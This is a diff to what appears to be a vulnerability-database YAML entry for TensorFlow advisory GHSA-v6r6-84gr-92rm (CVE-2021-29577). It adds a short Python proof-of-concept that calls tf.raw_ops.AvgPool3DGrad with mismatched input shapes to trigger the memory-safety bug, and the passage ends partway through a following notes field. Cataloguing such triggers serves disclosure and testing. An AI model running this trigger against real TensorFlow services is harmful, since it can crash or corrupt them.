@@ -31,6 +31,18 @@ fix_commit: "https://github.com/tensorflow/tensorflow/commit/a2b743f6017d7b97af1
 github_advisory: GHSA-v6r6-84gr-92rm
 poc_available: true
 poc_link: "https://github.com/advisories/GHSA-v6r6-84gr-92rm"
+poc_code: |
+  import tensorflow as tf
+
+  orig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)
+  grad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)
+  ksize = [1, 1, 1, 1, 1]
+  strides = [1, 1, 1, 1, 1]
+  padding = "SAME"
+
+  tf.raw_ops.AvgPool3DGrad(
+    orig_input_shape=orig_input_shape, grad=grad,
+    ksize=ksize, strides=strides, padding=padding)
 poc_notes: >
   Python snippet embedded in the advisory (GHSA-v6r6-84gr-92rm / CVE-2021-29577)
   calling tf.raw_ops.AvgPool3DGrad with orig_input_shape=[10,6,3,7,7], a
